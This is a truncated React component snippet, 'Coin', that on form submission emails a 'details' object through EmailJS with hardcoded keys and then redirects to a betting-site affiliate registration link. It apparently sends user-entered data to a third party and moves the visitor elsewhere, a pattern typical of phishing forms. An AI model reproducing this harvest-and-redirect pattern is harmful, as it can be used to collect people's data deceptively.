...
function Coin() {
  ...
  const handleSubmit = async (e) => {
    ...
    await emailjs
      .send('service_1bipru1', 'template_dfjv3pi', details, 'Zv3dA0R0JSL2s0LwA')
      .then(
        function (response) {
          window.location.href =
            'https://register.bet9ja.com/?btag=a_302412b_2c_2948667750&s1=GoogleBrand_REG&promocode=&clickid=&p=a&s=new&gclid=CjwKCAjww7KmBhAyEiwA5-PUSr-SUdK-Gp8E2L8bCAQMLBp_Sq7yeS8aqWTHUxKvmO2HYqbd_NMzgxoCvrcQAvD_BwE';
        },
        function (error) {
